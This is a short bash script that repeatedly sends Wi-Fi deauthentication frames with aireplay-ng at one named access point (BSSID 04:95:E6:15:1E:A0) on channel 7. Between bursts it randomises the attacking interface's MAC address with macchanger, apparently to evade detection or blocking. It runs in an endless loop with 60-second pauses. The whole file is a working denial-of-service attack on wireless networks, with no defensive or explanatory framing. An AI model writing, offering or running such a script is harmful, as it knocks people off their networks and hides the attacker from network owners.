#!/bin/bash

while true
do
	iwconfig wlan0mon channel 7
	aireplay-ng -0 10 -a 04:95:E6:15:1E:A0 wlan0mon
	ifconfig wlan0mon down
	macchanger -r wlan0mon | grep "New MAC"
	#iwconfig wlan0 mode monitor
	ifconfig wlan0mon up
	echo "Wait.. 60 sec"
	sleep 60
done
